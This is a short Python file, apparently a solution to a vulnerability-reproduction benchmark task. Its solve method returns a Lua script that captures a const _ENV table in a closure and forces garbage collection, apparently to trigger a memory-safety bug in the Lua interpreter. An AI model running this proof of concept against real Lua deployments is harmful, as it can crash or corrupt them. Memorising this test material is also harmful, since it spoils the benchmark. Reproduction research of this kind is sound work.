import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = (
            "local saved\n"
            "do\n"
            "  local _ENV <const> = { a = 12345 }\n"
            "  saved = function() return a end\n"
            "end\n"
            "collectgarbage('collect')\n"
            "collectgarbage('collect')\n"
            "local v = saved()\n"
            "if v ~= 12345 then end\n"
        )
        return poc.encode()
